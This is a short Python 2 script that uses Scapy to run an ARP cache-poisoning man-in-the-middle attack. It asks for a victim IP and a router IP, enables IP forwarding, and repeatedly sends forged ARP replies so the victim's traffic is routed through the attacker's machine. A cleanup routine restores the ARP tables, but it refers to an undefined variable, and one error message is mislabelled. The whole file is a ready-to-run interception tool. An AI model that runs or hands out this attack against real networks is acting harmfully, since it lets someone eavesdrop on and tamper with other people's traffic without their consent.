from scapy.all import *
import sys
import os
import time

try :
	interface = raw_input("[*] Enter Desired Interface : ") #input (wlan0, eth0, etc.)
	victimIP  = raw_input("[*] Enter Victim IP Address : ")
	gatewayIP = raw_input("[*] Enter Router IP Address : ")

except KeyboardInterrupt :
	print "\n"
	print "[*] User Requested Shutdown"
	print "[*] Exiting"

print "\n"
print "[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#GET MAC
def get_mac(IP):
	conf.verb  = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans :
		return rcv.sprintf(r"%Ether.src%")

#REMOVE TRACE (Re-ARPing)
def reARP():
	print "\n"
	victimMAC  = get_mac(victimIP)
	gatewayMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
	print "[*] Disabling IP Forwarding..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[*] Shutting Down..."
	sys.exit(1)

#SEND FAKE REPLY
def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = vm))
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = gm))

#INT MAIN
def mitm():
	#GET VICTIM MAC
	try :
		victimMAC = get_mac(victimIP)
	except Exception :
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Couldn't Find Victim MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	
	#GET GATEWAY MAC
	try :
		gatewayMAC = get_mac(gatewayIP)
	except Exception :
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Couldn't Find Victim MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	
	#POISONING
	print "[*] Poisoning Targets..."
	while 1 :
		try :
			trick(gatewayMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt :
			reARP()
			break

#RUN
mitm()
